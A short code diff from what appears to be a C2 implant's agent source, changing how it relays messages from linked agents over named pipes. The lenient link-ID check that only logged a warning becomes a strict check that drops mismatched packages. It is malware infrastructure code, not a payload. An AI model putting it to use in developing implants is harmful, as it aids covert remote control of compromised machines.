@@ -454,25 +454,33 @@ VOID LinkPush()
 
                         if ( ReadFile( TempList->hPipe, Output, Length, &BytesSize, NULL ) )
                         {
-                            /* Parse Link ID from the package */
+                            // _dbg("Linked Agent -> (Msg %d bytes) -> C2", BytesSize);
+                            // print_bytes(Output, BytesSize);
+
+                            /* Verify Our Link ID from the package */
                             PARSER Temp = { 0 };
                             ParserNew(&Temp, Output, BytesSize);
 
                             UINT32 TempId = ParserGetInt32(&Temp);
-                            
-                            /* Verify Link ID matches - if not, log warning but process anyway
-                             * since we're reading from the correct pipe handle */
                             if ( TempId != TempList->LinkId ) {
-                                _dbg("Warning: Temp ID [%x] != Link ID [%x], but processing from known pipe", TempId, TempList->LinkId);
-                            } else {
-                                _dbg("Link ID [%x] verified, message of %d bytes", TempId, Temp.Length);
+                                _dbg("Temp ID [%x]", TempId);
+                                _dbg("Link ID [%x]", TempList->LinkId);
+                                _err("Incorrect Link ID for package. Moving on...");
+                                ParserDestroy(&Temp);
+                                LocalFree(Output);
+                                Output = NULL;
+                                continue;
                             }
+                            // UINT32 TempId = *(UINT32*)Output;
+                            // Output      += 4;
+                            // BytesSize   -= 4;
+                            _dbg("Link ID [%x] has message of %d bytes", TempId, BytesSize);
 
                             /* Send Link msg as a delegate type (LINK_MSG) */
+                            // Package = PackageInit( LINK_MSG, TRUE );
                             Package = PackageInit(NULL, FALSE);
                             PackageAddByte(Package, LINK_MSG);
                             PackageAddString(Package, TempList->AgentId, FALSE);
-                            /* Temp.Buffer already points past the Link ID after ParserGetInt32 */
                             PackageAddBytes(Package, Temp.Buffer, Temp.Length, TRUE);
 
                             PackageQueue(Package);
